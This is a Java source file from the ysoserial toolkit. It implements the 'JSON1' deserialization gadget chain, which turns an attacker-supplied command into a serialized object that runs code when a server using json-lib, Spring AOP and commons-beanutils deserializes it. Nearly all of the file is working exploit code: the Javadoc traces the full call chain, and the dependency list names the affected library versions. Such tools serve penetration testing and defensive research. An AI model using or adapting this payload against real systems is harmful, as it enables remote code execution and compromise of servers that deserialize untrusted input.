package ysoserial.payloads;


import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.lang.reflect.InvocationHandler;
import java.lang.reflect.InvocationTargetException;
import java.util.HashMap;
import java.util.Map;

import javax.management.openmbean.CompositeData;
import javax.management.openmbean.CompositeType;
import javax.management.openmbean.OpenDataException;
import javax.management.openmbean.OpenType;
import javax.management.openmbean.TabularDataSupport;
import javax.management.openmbean.TabularType;

import javax.xml.transform.Templates;

import org.springframework.aop.framework.AdvisedSupport;
import com.sun.corba.se.spi.orbutil.proxy.CompositeInvocationHandlerImpl;
import net.sf.json.JSONObject;


/**
 *
 * A bit more convoluted example
 *
 * com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl.getOutputProperties()
 * java.lang.reflect.Method.invoke(Object, Object...)
 * org.springframework.aop.support.AopUtils.invokeJoinpointUsingReflection(Object, Method, Object[])
 * org.springframework.aop.framework.JdkDynamicAopProxy.invoke(Object, Method, Object[])
 * $Proxy0.getOutputProperties()
 * java.lang.reflect.Method.invoke(Object, Object...)
 * org.apache.commons.beanutils.PropertyUtilsBean.invokeMethod(Method, Object, Object[])
 * org.apache.commons.beanutils.PropertyUtilsBean.getSimpleProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtilsBean.getNestedProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtilsBean.getProperty(Object, String)
 * org.apache.commons.beanutils.PropertyUtils.getProperty(Object, String)
 * net.sf.json.JSONObject.defaultBeanProcessing(Object, JsonConfig)
 * net.sf.json.JSONObject._fromBean(Object, JsonConfig)
 * net.sf.json.JSONObject.fromObject(Object, JsonConfig)
 * net.sf.json.JSONObject(AbstractJSON)._processValue(Object, JsonConfig)
 * net.sf.json.JSONObject._processValue(Object, JsonConfig)
 * net.sf.json.JSONObject.processValue(Object, JsonConfig)
 * net.sf.json.JSONObject.containsValue(Object, JsonConfig)
 * net.sf.json.JSONObject.containsValue(Object)
 * javax.management.openmbean.TabularDataSupport.containsValue(CompositeData)
 * javax.management.openmbean.TabularDataSupport.equals(Object)
 * java.util.HashMap<K,V>.putVal(int, K, V, boolean, boolean)
 * java.util.HashMap<K,V>.readObject(ObjectInputStream)
 *
 * @author mbechler
 *
 */
@SuppressWarnings ( {
    "rawtypes", "unchecked", "restriction"
} )
@Dependencies({ "net.sf.json-lib:json-lib:jar:jdk15:2.4", "org.springframework:spring-aop:4.1.4.RELEASE",
    // deep deps
    "aopalliance:aopalliance:1.0", "commons-logging:commons-logging:1.2", "commons-lang:commons-lang:2.6",
    "net.sf.ezmorph:ezmorph:1.0.6", "commons-beanutils:commons-beanutils:1.9.2",
    "org.springframework:spring-core:4.1.4.RELEASE", "commons-collections:commons-collections:3.1" })
@Authors({ Authors.MBECHLER })
public class JSON1 extends ExtendedObjectPayload<Object> {

    public Map getObject ( String[] command ) throws Exception {
        return makeCallerChain(Gadgets.createTemplatesImpl(command), Templates.class);
    }


    /**
     * Will call all getter methods on payload that are defined in the given interfaces
     */
    public static Map makeCallerChain ( Object payload, Class... ifaces ) throws OpenDataException, NoSuchMethodException, InstantiationException,
            IllegalAccessException, InvocationTargetException, Exception, ClassNotFoundException {
        CompositeType rt = new CompositeType("a", "b", new String[] {
            "a"
        }, new String[] {
            "a"
        }, new OpenType[] {
            javax.management.openmbean.SimpleType.INTEGER
        });
        TabularType tt = new TabularType("a", "b", rt, new String[] {
            "a"
        });
        TabularDataSupport t1 = new TabularDataSupport(tt);
        TabularDataSupport t2 = new TabularDataSupport(tt);

        // we need to make payload implement composite data
        // it's very likely that there are other proxy impls that could be used
        AdvisedSupport as = new AdvisedSupport();
        as.setTarget(payload);
        InvocationHandler delegateInvocationHandler = (InvocationHandler) Reflections
                .getFirstCtor("org.springframework.aop.framework.JdkDynamicAopProxy").newInstance(as);
        InvocationHandler cdsInvocationHandler = Gadgets.createMemoizedInvocationHandler(Gadgets.createMap("getCompositeType", rt));
        CompositeInvocationHandlerImpl invocationHandler = new CompositeInvocationHandlerImpl();
        invocationHandler.addInvocationHandler(CompositeData.class, cdsInvocationHandler);
        invocationHandler.setDefaultHandler(delegateInvocationHandler);
        final CompositeData cdsProxy = Gadgets.createProxy(invocationHandler, CompositeData.class, ifaces);

        JSONObject jo = new JSONObject();
        Map m = new HashMap();
        m.put("t", cdsProxy);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(jo, "properties", m);
        Reflections.setFieldValue(t1, "dataMap", jo);
        Reflections.setFieldValue(t2, "dataMap", jo);
        return Gadgets.makeMap(t1, t2);
    }

    public static void main ( final String[] args ) throws Exception {
        PayloadRunner.run(JSON1.class, args);
    }

}
